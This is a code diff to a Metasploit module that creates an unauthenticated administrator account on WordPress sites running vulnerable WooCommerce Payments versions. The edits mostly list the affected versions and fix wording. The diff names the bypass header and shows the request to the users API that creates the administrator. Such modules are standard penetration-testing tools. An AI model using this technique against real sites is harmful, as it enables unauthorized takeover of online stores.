@@ -14,9 +14,12 @@ class MetasploitModule < Msf::Auxiliary
         info,
         'Name' => 'Wordpress Plugin WooCommerce Payments Unauthenticated Admin Creation',
         'Description' => %q{
-          WooCommerce-Payments plugin for Wordpress contains an authentication bypass by specifing a valid user ID number
-          within the `X-WCPAY-PLATFORM-CHECKOUT-USER` header.  With this authentication bypass, a user can then use the API
-          to create a new user with administartive privileges IF the user ID selected was also an administrator.
+          WooCommerce-Payments plugin for Wordpress versions 4.8 prior to 4.8.2, 4.9 prior to 4.9.1,
+          5.0 prior to 5.0.4, 5.1 prior to 5.1.3, 5.2 prior to 5.2.2, 5.3 prior to 5.3.1, 5.4 prior to 5.4.1,
+          5.5 prior to 5.5.2, and 5.6 prior to 5.6.2 contain an authentication bypass by specifying a valid user ID number
+          within the X-WCPAY-PLATFORM-CHECKOUT-USER header. With this authentication bypass, a user can then use the API
+          to create a new user with administrative privileges on the target WordPress site IF the user ID
+          selected corresponds to an administrator account.
         },
         'License' => MSF_LICENSE,
         'Author' => [
@@ -73,7 +76,7 @@ class MetasploitModule < Msf::Auxiliary
       email = Rex::Text.rand_mail_address
     end
 
-    print_status("Attempting to create administrator -> #{datastore['USERNAME']}:#{password} (#{email})")
+    print_status("Attempting to create an administrator user -> #{datastore['USERNAME']}:#{password} (#{email})")
     [nil, 'index.php'].each do |url_root| # try through both '' and 'index.php' since API can be in 2 diff places based on install/rewrites
       res = send_request_cgi({
         'uri' => normalize_uri(target_uri.path, url_root, 'wp-json', 'wp', 'v2', 'users'),
@@ -99,7 +102,7 @@ class MetasploitModule < Msf::Auxiliary
             protocol: 'tcp',
             workspace_id: myworkspace_id,
             origin_type: :service,
-            service_name: 'Wordpress',
+            service_name: 'WordPress',
             private_type: :password,
             module_fullname: fullname,
             access_level: 'administrator',
